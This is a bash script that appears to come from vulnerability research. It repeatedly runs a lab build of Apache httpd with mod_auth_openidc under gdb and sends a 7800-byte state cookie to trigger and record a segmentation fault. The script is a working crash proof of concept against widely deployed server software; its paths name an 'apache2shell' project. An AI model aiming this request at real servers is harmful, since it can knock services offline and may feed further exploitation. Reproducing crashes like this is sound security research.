#!/usr/bin/env bash
# Catch the plain-module SIGSEGV from a bare 7800-byte state token under gdb.
# Loopback only, lab addresses under gdb (ASLR off). No forced execution.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
CONF="$HERE/httpd-plain.conf"
ERR="$HERE/error-plain.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/plain-crash"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
: >"$OUT/gdb-codes.txt"
PAD=$(printf 'a%.0s' $(seq 1 7800))
stop() { "$HTTPD" -f "$CONF" -k stop >/dev/null 2>&1 || true; sleep 1; }
trap stop EXIT

for t in 1 2 3 4 5 6; do
  stop
  rm -f "$HERE/httpd-plain.pid"
  : >"$ERR"
  timeout 20 gdb -q -batch \
    -ex 'set pagination off' -ex 'set disable-randomization off' \
    -ex "run -f $CONF -X" \
    -ex 'printf "\nSTOP PC=%p\n", $pc' \
    -ex 'bt 15' \
    -ex 'info registers rip rsp' \
    --args "$HTTPD" >"$OUT/gdb-$t.txt" 2>&1 &
  gp=$!
  for i in 1 2 3 4 5 6 7 8 9 10; do
    ready=$(curl -sS --max-time 3 -o /dev/null -w '%{http_code}' "$URL" 2>/dev/null || true)
    [ "$ready" != "000" ] && break
    sleep 1
  done
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_$PAD" "$URL" 2>/dev/null || echo CURLERR)
  printf 'trial=%s code=%s\n' "$t" "$code" >>"$OUT/gdb-codes.txt"
  wait "$gp" || true
  cp "$ERR" "$OUT/gdb-$t-error.log"
done
printf 'gdb run finished: %s\n' "$(date -u +%FT%TZ)" >>"$OUT/gdb-codes.txt"
cat "$OUT/gdb-codes.txt"
